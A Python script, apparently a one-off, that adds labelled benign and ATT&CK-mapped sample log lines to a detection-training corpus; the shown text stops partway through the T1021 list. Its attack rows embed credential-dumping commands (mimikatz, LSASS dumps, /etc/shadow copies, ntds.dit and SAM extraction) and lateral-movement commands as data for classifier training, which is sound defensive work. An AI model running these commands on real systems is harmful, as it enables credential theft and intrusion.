"""One-shot corpus expansion: bring every ATT&CK class to 20 samples and
broaden under-represented families (Firewall, IDS, Network, Cloud) plus
add sub-technique coverage for T1003 / T1021 / T1059 / T1552.

Run once with ``python scripts/expand_corpus.py``, inspect the resulting
class counts, then delete this file.  It lives outside ``src/`` so it is
never imported by the production app.
"""
from __future__ import annotations

import json
import sys
from collections import Counter
from pathlib import Path

CORPUS = Path(__file__).resolve().parents[1] / "tests" / "data" / "mitre_all_techniques.jsonl"
TARGET_PER_CLASS = 20


def row(raw_log: str, family: str, subtype: str, intent: str, mapping: str, confidence: str, note: str) -> dict:
    return {
        "raw_log": raw_log,
        "metadata": {
            "family": family,
            "subtype": subtype,
            "intent": intent,
            "attack_mapping": mapping,
            "confidence": confidence,
            "analyst_interpretation": note,
        },
    }


# Additional benign rows that cover under-represented benign shapes so the
# model does not associate *every* Firewall / IDS / Cloud record with an
# attack class.
BENIGN_EXTRA = [
    row(
        "date=2024-02-05 time=08:00:00 devname=FG-DC-01 type=traffic srcip=10.0.0.60 dstip=10.0.0.100 dstport=443 action=accept sentbyte=5100 rcvdbyte=92100 proto=6 service=HTTPS",
        "Firewall", "Fortinet KV", "Benign", "BENIGN", "high",
        "Internal HTTPS request to an internal service with healthy bidirectional volume.",
    ),
    row(
        "date=2024-02-05 time=08:05:00 devname=FG-DC-01 type=traffic srcip=10.0.0.61 dstip=10.0.0.100 dstport=443 action=accept sentbyte=3200 rcvdbyte=74100 proto=6 service=HTTPS",
        "Firewall", "Fortinet KV", "Benign", "BENIGN", "high",
        "Routine internal HTTPS API call - nothing anomalous.",
    ),
    row(
        "date=2024-02-05 time=08:10:00 devname=FG-DC-01 type=traffic srcip=10.0.0.62 dstip=10.0.1.20 dstport=5432 action=accept sentbyte=2200 rcvdbyte=35100 proto=6 service=postgres",
        "Firewall", "Fortinet KV", "Benign", "BENIGN", "high",
        "Application host connecting to an internal Postgres instance - normal DB access.",
    ),
    row(
        "{\"@timestamp\":\"2024-02-05T08:15:00Z\",\"id.orig_h\":\"10.0.2.20\",\"id.resp_h\":\"10.0.2.10\",\"id.resp_p\":53,\"proto\":\"udp\",\"service\":\"dns\",\"duration\":0.02,\"orig_bytes\":62,\"resp_bytes\":180,\"conn_state\":\"SF\"}",
        "IDS", "Zeek JSON", "Benign", "BENIGN", "high",
        "Short internal DNS query with a reasonable response size - standard name resolution.",
    ),
    row(
        "{\"@timestamp\":\"2024-02-05T08:20:00Z\",\"id.orig_h\":\"10.0.2.21\",\"id.resp_h\":\"142.250.80.46\",\"id.resp_p\":443,\"proto\":\"tcp\",\"service\":\"ssl\",\"duration\":12,\"orig_bytes\":9200,\"resp_bytes\":182000,\"conn_state\":\"SF\"}",
        "IDS", "Zeek JSON", "Benign", "BENIGN", "high",
        "TLS flow to Google with normal bidirectional volume - routine browsing.",
    ),
    row(
        "{\"@timestamp\":\"2024-02-05T08:25:00Z\",\"id.orig_h\":\"10.0.2.22\",\"id.resp_h\":\"52.97.165.34\",\"id.resp_p\":443,\"proto\":\"tcp\",\"service\":\"ssl\",\"duration\":25,\"orig_bytes\":42000,\"resp_bytes\":388000,\"conn_state\":\"SF\"}",
        "IDS", "Zeek JSON", "Benign", "BENIGN", "high",
        "Microsoft 365 TLS flow with expected bidirectional usage - healthy Office traffic.",
    ),
    row(
        "2024-02-05T08:30:00Z CLOUDAPI aws: event=ConsoleLogin user=jdoe sourceIPAddress=10.20.1.5 userAgent=Mozilla/5.0 mfaUsed=Yes responseElements.ConsoleLogin=Success",
        "Cloud", "CloudTrail", "Benign", "BENIGN", "high",
        "AWS console login by a named user from the corporate IP with MFA - normal access.",
    ),
    row(
        "2024-02-05T08:35:00Z CLOUDAPI aws: event=DescribeInstances user=svc_ops sourceIPAddress=10.20.1.8 userAgent=aws-cli/2.7 errorCode=None",
        "Cloud", "CloudTrail", "Benign", "BENIGN", "high",
        "Read-only DescribeInstances call by the ops service account from the corporate IP.",
    ),
    row(
        "2024-02-05T08:40:00Z CLOUDAPI azure: event=Microsoft.Authorization/elevateAccess/action user=admin@corp.example result=Success reason=jitApprovedByAdmin",
        "Cloud", "AzureActivity", "Benign", "BENIGN", "high",
        "JIT-approved privilege elevation for a known admin - documented change window.",
    ),
    row(
        "2024-02-05T08:45:00Z CLOUDAPI gcp: protoPayload.methodName=storage.objects.get user=svc_app@project.iam resource=gs://app-bucket/config.json result=ok",
        "Cloud", "GCPAudit", "Benign", "BENIGN", "high",
        "Service account reading its normal configuration object from its own bucket.",
    ),
    row(
        "Feb  5 09:00:00 web01 nginx: 10.0.0.80 - mjones [05/Feb/2024:09:00:00 +0000] \"GET /static/app.js HTTP/1.1\" 200 48211 \"https://app.example.com/\" \"Mozilla/5.0\"",
        "Network", "Web Access", "Benign", "BENIGN", "high",
        "Internal static asset fetch from a page the user is on - normal referrer chain.",
    ),
    row(
        "Feb  5 09:05:00 web01 nginx: 10.0.0.81 - mjones [05/Feb/2024:09:05:00 +0000] \"GET /api/v1/me HTTP/1.1\" 200 312 \"https://app.example.com/dashboard\" \"Mozilla/5.0\"",
        "Network", "Web Access", "Benign", "BENIGN", "high",
        "Authenticated /me profile call from the dashboard - expected SPA behaviour.",
    ),
    row(
        "user=bob logged in successfully from 10.0.0.15 and launched teams.exe",
        "Windows", "Generic", "Benign", "BENIGN", "high",
        "Routine user login followed by launching Microsoft Teams.",
    ),
    row(
        "user=carol successful logon from 192.168.10.22 workstation=LAPTOP-CAROL",
        "Windows", "Generic", "Benign", "BENIGN", "high",
        "Successful internal workstation logon by a known user.",
    ),
    row(
        "Feb  5 09:10:00 jump01 sshd[6620]: Accepted publickey for deploy from 10.20.1.5 port 52300 ssh2: RSA SHA256:abc",
        "Linux", "Syslog", "Benign", "BENIGN", "high",
        "Automation key-based SSH login from CI network - expected deploy flow.",
    ),
    row(
        "Feb  5 09:15:00 app02 sshd[6630]: Accepted publickey for ansible from 10.20.1.7 port 52311 ssh2",
        "Linux", "Syslog", "Benign", "BENIGN", "high",
        "Ansible config-mgmt key login from admin subnet.",
    ),
    row(
        "Feb  5 09:20:00 web02 systemd[1]: Started Session 53 of user app.",
        "Linux", "Syslog", "Benign", "BENIGN", "high",
        "systemd started a normal app user session after successful auth.",
    ),
    row(
        "2024-02-05T09:25:00Z WORKSTATION60 Sysmon EventID=1: Process Create. process=C:\\Program Files\\Microsoft VS Code\\Code.exe user=CORP\\dev02 parent_process=C:\\Windows\\Explorer.exe",
        "Windows", "Sysmon", "Benign", "BENIGN", "high",
        "VSCode launched from its signed install path - developer IDE workflow.",
    ),
    row(
        "2024-02-05T09:30:00Z WORKSTATION61 Sysmon EventID=1: Process Create. process=C:\\Program Files\\Slack\\slack.exe user=CORP\\jdoe parent_process=C:\\Windows\\Explorer.exe",
        "Windows", "Sysmon", "Benign", "BENIGN", "high",
        "Slack desktop client launched normally by the user.",
    ),
    row(
        "2024-02-05T09:35:00Z WORKSTATION62 Sysmon EventID=3: Network connection. process=C:\\Program Files\\Slack\\slack.exe destination_ip=13.248.243.5 destination_port=443 user=CORP\\jdoe",
        "Windows", "Sysmon", "Benign", "BENIGN", "high",
        "Slack client establishing its normal WebSocket/HTTPS connection to Slack cloud.",
    ),
    row(
        "2024-02-05T09:40:00Z SERVER11 WinEvent EventID=4624: An account was successfully logged on. Account Name: CORP\\svc_iis  Logon Type: 5 (Service)",
        "Windows", "Winlogbeat", "Benign", "BENIGN", "high",
        "IIS service account service logon at scheduled worker process recycle.",
    ),
    row(
        "Feb  5 10:00:00 db01 audit: type=EXECVE pid=1200 uid=999 cmdline=/usr/bin/pg_dump -U app ordersdb -f /var/backups/orders.sql",
        "Linux", "AuditD", "Benign", "BENIGN", "high",
        "Scheduled backup job running pg_dump into its canonical backup directory.",
    ),
    row(
        "Feb  5 10:05:00 backup01 audit: type=EXECVE pid=1210 uid=999 cmdline=/usr/bin/tar czf /var/backups/daily/etc.tgz /etc",
        "Linux", "AuditD", "Benign", "BENIGN", "medium",
        "Daily config backup archive under the dedicated backup user and path.",
    ),
    row(
        "Feb  5 10:10:00 k8s-node-07 kubelet: Container 'redis-3' healthy (livenessProbe: http-get http://:6379/health 200 OK)",
        "Linux", "Kubernetes", "Benign", "BENIGN", "high",
        "Kubelet liveness probe passing for a standard workload - healthy container.",
    ),
    row(
        "Feb  5 10:15:00 web01 nginx: 10.0.0.90 - - [05/Feb/2024:10:15:00 +0000] \"GET /healthz HTTP/1.0\" 200 2 \"-\" \"kube-probe/1.27\"",
        "Network", "Web Access", "Benign", "BENIGN", "high",
        "Kubernetes probe hitting /healthz - standard container-health signal.",
    ),
    row(
        "2024-02-05T10:20:00Z WORKSTATION63 Defender: Scheduled scan completed. Items scanned: 214532  Threats detected: 0",
        "Windows", "Defender", "Benign", "BENIGN", "high",
        "Scheduled AV full scan completed with zero detections - clean endpoint.",
    ),
    row(
        "2024-02-05T10:25:00Z PROXY01 proxy: user=kchen method=GET host=docs.python.org path=/3/library/asyncio.html status=200 bytes=82311",
        "Network", "Proxy", "Benign", "BENIGN", "high",
        "Routine documentation lookup by a developer - expected engineering traffic.",
    ),
    row(
        "2024-02-05T10:30:00Z PROXY01 proxy: user=kchen method=GET host=api.github.com path=/repos/company/app/issues status=200 bytes=14022",
        "Network", "Proxy", "Benign", "BENIGN", "high",
        "GitHub API read-only call from a developer - standard dev workflow.",
    ),
    row(
        "Feb  5 11:00:00 mail02 postfix/smtpd[7801]: connect from mx.trusted-partner.com[203.0.113.205]",
        "Linux", "Syslog", "Benign", "BENIGN", "high",
        "Inbound SMTP from a known allow-listed partner MTA.",
    ),
    row(
        "Feb  5 11:05:00 mail02 postfix/smtp[7810]: 9C3D2E: to=<user@partner.com>, relay=mx.partner.com[198.51.100.240]:25, status=sent (250 Ok)",
        "Linux", "Syslog", "Benign", "BENIGN", "high",
        "Outbound mail delivery to an allow-listed partner relay - 250 Ok.",
    ),
    row(
        "2024-02-05T11:15:00Z VPN01 openvpn[9100]: user=remote02 AUTH OK from 198.51.100.50  peer-cn=remote02.corp.example.com",
        "Network", "VPN", "Benign", "BENIGN", "high",
        "Remote employee VPN auth using a valid enrolled certificate.",
    ),
    row(
        "2024-02-05T11:20:00Z DNS01 named[3410]: client 10.0.1.50#51000: query: api.stripe.com IN A (10.0.0.53)",
        "Linux", "Named DNS Log", "Benign", "BENIGN", "high",
        "Application resolving Stripe API hostname - approved payment-processing dependency.",
    ),
    row(
        "2024-02-05T11:25:00Z DNS01 named[3410]: client 10.0.1.51#51010: query: update.microsoft.com IN A (10.0.0.53)",
        "Linux", "Named DNS Log", "Benign", "BENIGN", "high",
        "Microsoft Update resolver lookup from a managed workstation.",
    ),
    row(
        "Feb  5 11:30:00 buildhost02 docker[8100]: Container 'test-runner-55' image=internal.registry/test:v3 started",
        "Linux", "Syslog", "Benign", "BENIGN", "high",
        "Integration test runner container started from the approved internal registry.",
    ),
    row(
        "Feb  5 11:35:00 buildhost02 docker[8100]: Container 'test-runner-55' exited with status 0",
        "Linux", "Syslog", "Benign", "BENIGN", "high",
        "Test runner container exited successfully - CI job finished cleanly.",
    ),
    row(
        "2024-02-05T12:00:00Z WORKSTATION64 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\mstsc.exe user=CORP\\itadmin parent_process=C:\\Windows\\Explorer.exe cmdline=mstsc /v:DC01.corp.local",
        "Windows", "Sysmon", "Benign", "BENIGN", "medium",
        "IT admin opening RDP to a documented DC from their approved admin workstation.",
    ),
    row(
        "2024-02-05T12:05:00Z DC01 WinEvent EventID=4624: An account was successfully logged on. Account Name: CORP\\itadmin  Logon Type: 10  Source Network Address: 10.50.0.10",
        "Windows", "Winlogbeat", "Benign", "BENIGN", "medium",
        "RDP logon to DC by a privileged admin from the admin jump subnet - documented flow.",
    ),
    row(
        "Feb  5 12:30:00 app03 CRON[6700]: (app) CMD (/usr/bin/node /var/www/cron/retention.js)",
        "Linux", "Syslog", "Benign", "BENIGN", "high",
        "Scheduled data-retention Node script running as the app user.",
    ),
    row(
        "Feb  5 12:35:00 app03 CRON[6710]: (root) CMD (/usr/sbin/logrotate -f /etc/logrotate.d/app)",
        "Linux", "Syslog", "Benign", "BENIGN", "high",
        "Forced logrotate on the app rules file - standard operator task.",
    ),
]


# Attack fill: broad variety to reach 20 samples/class for every T-code.
# Each bucket lists the parent technique id and a list of (raw_log, family,
# subtype, intent, sub_mapping_or_parent, confidence, note) tuples.
ATTACK_FILL_V2 = [
    # T1003 OS Credential Dumping (currently 7) -> +13
    ("T1003", [
        ("2024-02-10T09:00:00Z WORKSTATION70 Sysmon EventID=1: Process Create. process=C:\\Users\\Public\\procdump.exe cmdline=procdump -ma lsass.exe C:\\Users\\Public\\lsass.dmp user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1003.001", "high", "procdump -ma against lsass.exe - textbook LSASS memory dump for credentials."),
        ("2024-02-10T09:05:00Z WORKSTATION71 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\rundll32.exe cmdline=rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 840 C:\\Users\\Public\\lsass.bin full user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1003.001", "high", "comsvcs.dll MiniDump of lsass PID - living-off-the-land LSASS credential dump."),
        ("Feb 10 09:10:00 host20 audit: type=EXECVE pid=7001 uid=0 cmdline=cat /etc/shadow", "Linux", "AuditD", "Malicious", "T1003.008", "high", "Direct /etc/shadow read by root - offline hash cracking setup."),
        ("Feb 10 09:15:00 host21 audit: type=EXECVE pid=7010 uid=0 cmdline=cp /etc/shadow /tmp/s.bak", "Linux", "AuditD", "Malicious", "T1003.008", "high", "Copying /etc/shadow to /tmp - staging hashes for exfil."),
        ("2024-02-10T09:20:00Z DC04 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\ntdsutil.exe cmdline=ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\Temp\\ad\" q q user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1003.003", "high", "ntdsutil IFM full dump of NTDS.dit - domain-wide credential theft."),
        ("2024-02-10T09:25:00Z DC05 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\esentutl.exe cmdline=esentutl /y /vss c:\\windows\\ntds\\ntds.dit /d c:\\temp\\ntds.dit user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1003.003", "high", "esentutl VSS copy of ntds.dit - AD database theft via Volume Shadow Copy."),
        ("2024-02-10T09:30:00Z WORKSTATION72 Sysmon EventID=1: Process Create. process=C:\\Users\\Public\\mimi.exe cmdline=mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1003.001", "high", "mimikatz sekurlsa::logonpasswords - classic credential dumping."),
        ("2024-02-10T09:35:00Z WORKSTATION73 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\reg.exe cmdline=reg save HKLM\\SAM C:\\Users\\Public\\sam.sav user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1003.002", "high", "reg save of HKLM\\SAM hive - offline SAM database cracking."),
        ("2024-02-10T09:40:00Z WORKSTATION74 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\reg.exe cmdline=reg save HKLM\\SYSTEM C:\\Users\\Public\\sys.sav user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1003.002", "high", "reg save of HKLM\\SYSTEM - needed alongside SAM hive for hash extraction."),
        ("Feb 10 09:45:00 host22 audit: type=EXECVE pid=7020 uid=0 cmdline=cp /etc/gshadow /tmp/g.bak", "Linux", "AuditD", "Malicious", "T1003.008", "high", "Copy /etc/gshadow - group password hashes staged for exfil."),
        ("2024-02-10T09:50:00Z DC06 WinEvent EventID=4624: An account was successfully logged on. Account Name: CORP\\$DC05  Logon Type: 3  AuthenticationPackage: Kerberos  TransitedServices=DCSync", "Windows", "Winlogbeat", "Malicious", "T1003.006", "high", "DCSync replication request by a non-DC machine account - credential replication abuse."),
        ("2024-02-10T09:55:00Z WORKSTATION75 Sysmon EventID=1: Process Create. process=C:\\Users\\Public\\dump.exe cmdline=procdump.exe -accepteula -ma 884 C:\\Windows\\Temp\\creds.dmp user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1003.001", "high", "procdump by PID with -accepteula bypass - scripted LSASS dump."),
        ("Feb 10 10:00:00 host23 audit: type=EXECVE pid=7030 uid=0 cmdline=strings /etc/shadow > /tmp/readable.txt", "Linux", "AuditD", "Malicious", "T1003.008", "medium", "strings run on /etc/shadow piping readable output - adversary inspecting hashes."),
    ]),
    # T1012 Query Registry (currently 5) -> +15
    ("T1012", [
        ("2024-02-10T10:05:00Z WORKSTATION76 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\reg.exe cmdline=reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1012", "high", "Enumerating installed software via Uninstall keys."),
        ("2024-02-10T10:10:00Z WORKSTATION77 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe cmdline=Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Cryptography' -Name MachineGuid user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1012", "high", "Reading MachineGuid - host fingerprinting via registry."),
        ("2024-02-10T10:15:00Z WORKSTATION78 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\reg.exe cmdline=reg query HKCU\\Software\\Microsoft\\Terminal Server Client\\Servers user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1012", "high", "Enumerating saved RDP connections from user registry."),
        ("2024-02-10T10:20:00Z WORKSTATION79 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\reg.exe cmdline=reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1012", "medium", "Querying Windows Update policies - evaluating patch posture."),
        ("2024-02-10T10:25:00Z WORKSTATION80 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\reg.exe cmdline=reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurePipeServers\\winreg user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1012", "medium", "Remote-registry ACL enumeration."),
        ("2024-02-10T10:30:00Z WORKSTATION81 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe cmdline=Get-ChildItem 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1012", "high", "OS version / patch enumeration via registry."),
        ("2024-02-10T10:35:00Z WORKSTATION82 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\reg.exe cmdline=reg query HKLM\\SAM\\SAM\\Domains\\Account\\Users /s user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1012", "high", "Recursive reg query of SAM users subtree - account discovery via registry."),
        ("2024-02-10T10:40:00Z WORKSTATION83 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\reg.exe cmdline=reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Shares user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1012", "medium", "Enumerating SMB shares defined in the registry."),
        ("2024-02-10T10:45:00Z WORKSTATION84 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe cmdline=Get-ItemProperty 'HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run' user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1012", "high", "Enumerating 32-bit Run keys for persistence and installed tools."),
        ("2024-02-10T10:50:00Z WORKSTATION85 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\reg.exe cmdline=reg query HKCU\\Software\\Microsoft\\Office\\16.0\\Outlook\\Profiles user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1012", "medium", "Reading Outlook profile keys - email account discovery."),
        ("2024-02-10T10:55:00Z WORKSTATION86 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe cmdline=Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths' user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1012", "high", "Enumerating AV exclusion paths via registry - evasion planning."),
        ("2024-02-10T11:00:00Z WORKSTATION87 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\reg.exe cmdline=reg query 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Authentication\\Credential Providers' user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1012", "high", "Credential provider registry enumeration."),
        ("2024-02-10T11:05:00Z WORKSTATION88 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\reg.exe cmdline=reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1012", "high", "LSA configuration enumeration - credential-protection posture check."),
        ("2024-02-10T11:10:00Z WORKSTATION89 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\reg.exe cmdline=reg query HKLM\\SECURITY\\Policy\\Secrets /s user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1012", "high", "Registry enumeration of LSA Secrets paths - credential discovery."),
        ("2024-02-10T11:15:00Z WORKSTATION90 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\reg.exe cmdline=reg query HKLM\\SOFTWARE\\RealVNC\\vncserver user=CORP\\attacker", "Windows", "Sysmon", "Suspicious", "T1012", "medium", "Searching registry for VNC install - remote-access software discovery."),
    ]),
    # T1016 System Network Config Discovery (currently 5) -> +15
    ("T1016", [
        ("2024-02-10T11:20:00Z WORKSTATION91 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\route.exe cmdline=route print user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1016", "high", "route print dumping routing table - network topology discovery."),
        ("2024-02-10T11:25:00Z WORKSTATION92 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\netsh.exe cmdline=netsh interface show interface user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1016", "medium", "netsh interface show - local network interface enumeration."),
        ("2024-02-10T11:30:00Z WORKSTATION93 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\arp.exe cmdline=arp -a user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1016", "high", "arp -a for ARP cache dump - local subnet host discovery."),
        ("2024-02-10T11:35:00Z WORKSTATION94 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\netstat.exe cmdline=netstat -anob user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1016", "high", "netstat -anob enumerating active connections with owning processes."),
        ("Feb 10 11:40:00 host24 audit: type=EXECVE pid=7100 uid=33 cmdline=ss -tunap", "Linux", "AuditD", "Malicious", "T1016", "high", "ss listing TCP/UDP sockets with process mapping - Linux network discovery."),
        ("Feb 10 11:45:00 host25 audit: type=EXECVE pid=7110 uid=33 cmdline=ip route", "Linux", "AuditD", "Malicious", "T1016", "high", "ip route dumping routing table."),
        ("Feb 10 11:50:00 host26 audit: type=EXECVE pid=7120 uid=33 cmdline=cat /etc/resolv.conf", "Linux", "AuditD", "Malicious", "T1016", "medium", "Reading resolv.conf - DNS server discovery from a low-privilege user."),
        ("Feb 10 11:55:00 host27 audit: type=EXECVE pid=7130 uid=33 cmdline=iptables -L -n", "Linux", "AuditD", "Malicious", "T1016", "medium", "iptables -L -n listing firewall rules from a web-user uid."),
        ("Feb 10 12:00:00 host28 audit: type=EXECVE pid=7140 uid=33 cmdline=traceroute 10.0.0.1", "Linux", "AuditD", "Suspicious", "T1016", "medium", "traceroute toward the default gateway - mapping egress path."),
        ("2024-02-10T12:05:00Z WORKSTATION95 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\nslookup.exe cmdline=nslookup -type=ANY corp.example.com user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1016", "high", "nslookup ANY against the corp domain - DNS record enumeration."),
        ("Feb 10 12:10:00 host29 audit: type=EXECVE pid=7150 uid=33 cmdline=dig axfr corp.example.com @10.0.0.53", "Linux", "AuditD", "Malicious", "T1016", "high", "Attempted zone transfer against internal DNS - network mapping."),
        ("2024-02-10T12:15:00Z WORKSTATION96 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe cmdline=Get-NetIPConfiguration user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1016", "medium", "PowerShell cmdlet enumerating IP configuration across interfaces."),
        ("2024-02-10T12:20:00Z WORKSTATION97 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe cmdline=Get-NetNeighbor -AddressFamily IPv4 user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1016", "medium", "Get-NetNeighbor for ARP/IPv4 neighbor cache enumeration."),
        ("Feb 10 12:25:00 host30 audit: type=EXECVE pid=7160 uid=33 cmdline=ifconfig eth0", "Linux", "AuditD", "Suspicious", "T1016", "medium", "ifconfig of a single interface from a user context."),
        ("Feb 10 12:30:00 host31 audit: type=EXECVE pid=7170 uid=33 cmdline=ip a show", "Linux", "AuditD", "Suspicious", "T1016", "medium", "ip a enumerating addresses on all interfaces."),
    ]),
    # T1021 Remote Services (currently 6) -> +14
    ("T1021", [
        ("date=2024-02-10 time=12:35:00 devname=FG-EDGE-01 type=traffic srcip=10.0.3.60 dstip=198.51.100.120 dstport=3389 action=accept sentbyte=250000 rcvdbyte=1800000 proto=6 duration=3700 service=RDP", "Firewall", "Fortinet KV", "Malicious", "T1021.001", "high", "Accepted RDP to external IP with sustained bidirectional traffic - unauthorized remote desktop."),
        ("2024-02-10T12:40:00Z SERVER12 WinEvent EventID=4624: An account was successfully logged on. Account Name: CORP\\attacker  Logon Type: 10  Source Network Address: 198.51.100.120", "Windows", "Winlogbeat", "Malicious", "T1021.001", "high", "RDP (logon type 10) from an external untrusted IP."),
        ("Feb 10 12:45:00 bastion04 sshd[5300]: Accepted password for dba from 203.0.113.55 port 51001 ssh2", "Linux", "Syslog", "Malicious", "T1021.004", "high", "SSH password auth from external IP for a DBA account - lateral movement."),
        ("Feb 10 12:50:00 db02 sshd[5310]: Accepted publickey for root from 10.0.9.99 port 51005 ssh2", "Linux", "Syslog", "Malicious", "T1021.004", "high", "SSH key-based root login from an unexpected internal source - lateral movement."),
        ("2024-02-10T12:55:00Z WORKSTATION98 Sysmon EventID=1: Process Create. process=C:\\Users\\Public\\psexec.exe cmdline=psexec \\\\SERVER08 -u CORP\\attacker cmd.exe user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1021.002", "high", "psexec to a remote Windows host - classic SMB admin-share lateral movement."),
        ("2024-02-10T13:00:00Z WORKSTATION99 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe cmdline=Invoke-Command -ComputerName SERVER09 -ScriptBlock { whoami } user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1021.006", "high", "PowerShell Remoting Invoke-Command - WinRM lateral movement."),
        ("2024-02-10T13:05:00Z WORKSTATION100 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\winrs.exe cmdline=winrs -r:SERVER10 cmd /c ipconfig user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1021.006", "high", "winrs invoking remote shell - WinRM lateral move."),
        ("2024-02-10T13:10:00Z WORKSTATION101 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\net.exe cmdline=net use \\\\SERVER08\\C$ /user:CORP\\attacker user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1021.002", "high", "net use mapping the admin C$ share - SMB-based lateral access."),
        ("date=2024-02-10 time=13:15:00 devname=FG-EDGE-01 type=traffic srcip=10.0.3.70 dstip=203.0.113.44 dstport=22 action=accept sentbyte=500000 rcvdbyte=2400000 proto=6 duration=2100 service=SSH", "Firewall", "Fortinet KV", "Malicious", "T1021.004", "high", "Accepted SSH to external IP with hours of sustained traffic - unauthorized remote shell."),
        ("2024-02-10T13:20:00Z WORKSTATION102 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\mstsc.exe cmdline=mstsc /v:198.51.100.120 user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1021.001", "high", "mstsc initiating RDP to external IP - outbound remote desktop abuse."),
        ("Feb 10 13:25:00 jump03 sshd[5320]: Accepted publickey for serviceacct from 10.0.9.8 port 51020 ssh2", "Linux", "Syslog", "Suspicious", "T1021.004", "medium", "Service account SSH login to the jump host from an unusual internal IP."),
        ("2024-02-10T13:30:00Z WORKSTATION103 Sysmon EventID=3: Network connection. process=C:\\Windows\\System32\\svchost.exe user=NT AUTHORITY\\SYSTEM destination_ip=10.0.9.45 destination_port=5985", "Windows", "Sysmon", "Malicious", "T1021.006", "medium", "Outbound WinRM on 5985 from svchost - post-exploit remoting."),
        ("2024-02-10T13:35:00Z WORKSTATION104 Sysmon EventID=1: Process Create. process=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe cmdline=Enter-PSSession -ComputerName SERVER11 -Credential (Get-Credential) user=CORP\\attacker", "Windows", "Sysmon", "Malicious", "T1021.006", "high", "Enter-PSSession interactive PowerShell remoting."),
